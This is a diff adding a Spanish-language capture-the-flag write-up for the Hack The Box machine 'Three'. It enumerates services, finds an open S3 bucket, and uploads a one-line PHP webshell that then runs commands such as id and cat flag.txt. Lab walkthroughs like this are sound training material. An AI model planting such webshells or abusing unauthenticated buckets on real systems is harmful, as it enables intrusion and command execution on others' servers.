@@ -15,10 +15,146 @@ tags: []
 
 ## Enumeration
 
+Escaneamos con `nmap` todos los puertos para ver cuáles están abiertos y qué servicios corren en ellos.
+
+```bash
+sudo nmap -p- -sS --min-rate 5000 -Pn -n -vv -oA nmap/allports 10.129.227.248
+```
+
+```plaintext
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+```
+
+Escaneamos los puertos abiertos para ver más detalles sobre los servicios.
+
+```bash
+nmap -p 22,80 -sCV -oA nmap/openports 10.129.227.248
+```
+
+```plaintext
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 17:8b:d4:25:45:2a:20:b8:79:f8:e2:58:d7:8e:79:f4 (RSA)
+|   256 e6:0f:1a:f6:32:8a:40:ef:2d:a7:3b:22:d1:c7:14:fa (ECDSA)
+|_  256 2d:e1:87:41:75:f3:91:54:41:16:b7:2b:80:c6:8f:05 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: The Toppers
+Service Info: Host: thetoppers.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+El output muestra un posible redireccionamiento al dominio `thetoppers.htb`, agregamos la IP y el dominio al archivo `/etc/hosts`.
+
+```bash
+sudo nvim /etc/hosts
+```
+
+```plaintext
+10.129.227.248 thetoppers.htb
+```
+
+El servicio web aloja la página de una banda de música.
+
+![Three Webservice](@images/writeups/hackthebox/machines/three/three-webservice.png)
+
+Enumeramos subdominios.
+
+```bash
+ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://10.129.200.63 -H 'Host: FUZZ.thetoppers.htb' -ic -c -t 100 -mc all -fs 11952
+```
+
+```plaintext
+s3                      [Status: 404, Size: 21, Words: 2, Lines: 1, Duration: 168ms]
+```
+
+Agregamos el subdominio encontrado al archivo `/etc/hosts`.
+
+```bash
+sudo nvim /etc/hosts
+```
+
+```plaintext
+10.129.200.63 thetoppers.htb s3.thetoppers.htb
+```
+
+`s3` significa Simple Storage Service (Servicio de Almacenamiento Simple). Es un servicio de Amazon Web Services (AWS) que sirve para guardar cualquier tipo de archivo en la nube, como si fuera un Google Drive, en lugar de carpetas comunes, S3 utiliza un concepto llamado "Buckets". Interactuamos con el servicio usando `aws-cli` y como no tenemos credenciales evitamos que nos la pida con la flag `--no-sign-request`. Listamos los objetos que contiene el bucket.
+
+```bash
+aws --no-sign-request --endpoint-url http://s3.thetoppers.htb s3 ls --recursive s3://thetoppers.htb
+```
+
+```plaintext
+2026-07-28 11:44:43          0 .htaccess
+2026-07-28 11:44:43      90172 images/band.jpg
+2026-07-28 11:44:43     282848 images/band2.jpg
+2026-07-28 11:44:43    2208869 images/band3.jpg
+2026-07-28 11:44:43      77206 images/final.jpg
+2026-07-28 11:44:43      69170 images/mem1.jpg
+2026-07-28 11:44:43      39270 images/mem2.jpg
+2026-07-28 11:44:43      64347 images/mem3.jpg
+2026-07-28 11:44:43      11952 index.php
+```
+
 ## Exploitation
+
+Creamos una webshell.
+
+```bash
+echo '<?php system($_GET["cmd"]); ?>' > melvin.php
+```
+
+Subimos la webshell al bucket.
+
+```bash
+aws --no-sign-request --endpoint-url http://s3.thetoppers.htb s3 cp melvin.php s3://thetoppers.htb/
+```
+
+```plaintext
+upload: ./melvin.php to s3://thetoppers.htb/melvin.php
+```
+
+Ejecutamos comandos aprovechando la webshell. Primero vemos con usuario estamos ejecutando los comandos.
+
+```bash
+curl http://thetoppers.htb/melvin.php?cmd=id
+```
+
+```plaintext
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+En qué directorio estamos.
+
+```bash
+curl http://thetoppers.htb/melvin.php?cmd=pwd
+```
+
+```plaintext
+/var/www/html
+```
+
+Listamos el contenido del directorio padre y encontramos la flag.
+
+```bash
+curl http://thetoppers.htb/melvin.php?cmd=ls%20..
+```
+
+```plaintext
+flag.txt
+html
+```
+
+Leemos la flag.
+
+```bash
+curl http://thetoppers.htb/melvin.php?cmd=cat%20../flag.txt
+```
 
 ### Flag
 
 <Callout type="success" title="Flag">
-
+a******************************b
 </Callout>
